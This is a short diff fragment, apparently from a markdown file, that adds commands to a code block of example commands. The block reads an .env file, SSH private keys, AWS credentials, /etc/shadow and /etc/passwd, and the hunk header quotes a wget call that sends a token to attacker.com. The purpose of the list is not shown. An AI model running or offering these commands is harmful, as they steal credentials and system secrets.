@@ -11,4 +11,6 @@ wget https://attacker.com/steal?token=$TOKEN
 cat .env
 cat ~/.ssh/id_rsa
 cat ~/.aws/credentials
+cat /etc/shadow
+strings /etc/passwd
 ```
